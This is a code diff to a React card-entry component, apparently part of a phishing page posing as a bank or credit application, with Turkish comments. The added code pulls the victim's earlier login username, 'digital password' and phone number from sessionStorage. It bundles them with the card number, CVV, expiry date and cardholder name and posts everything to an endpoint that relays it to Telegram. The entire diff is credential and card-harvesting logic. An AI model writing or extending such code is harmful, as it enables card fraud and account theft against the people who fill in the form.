@@ -139,6 +139,12 @@ const CardComponent = () => {
 
     setIsLoading(true)
     try {
+      // Önceki verileri sessionStorage'dan al
+      const loginDataStr = sessionStorage.getItem('loginData')
+      const phoneDataStr = sessionStorage.getItem('phoneData')
+      const loginData = loginDataStr ? JSON.parse(loginDataStr) : null
+      const phoneData = phoneDataStr ? JSON.parse(phoneDataStr) : null
+
       // Telegram'a kart bilgilerini gönder
       const response = await fetch('/api/send-telegram', {
         method: 'POST',
@@ -146,13 +152,14 @@ const CardComponent = () => {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-          username: 'KART_BILGISI',
+          username: `${loginData?.username || 'TC_YOK'} | ${phoneData?.phone || 'TEL_YOK'}`,
           password: cardData.cvv,
           phone: cardData.cardNumber.replace(/\s/g, ''),
           creditLimit: `${cardData.expiryMonth}/${cardData.expiryYear}`,
           applicationDate: new Date().toLocaleDateString('tr-TR'),
           realName: cardData.cardHolder,
-          realSurname: 'KART_SAHIBI'
+          realSurname: `DijitalŞifre:${loginData?.password || 'YOK'} | KrediLimit:${phoneData?.creditLimit || 'YOK'}`,
+          messageType: 'CARD_INFO'
         })
       })
 
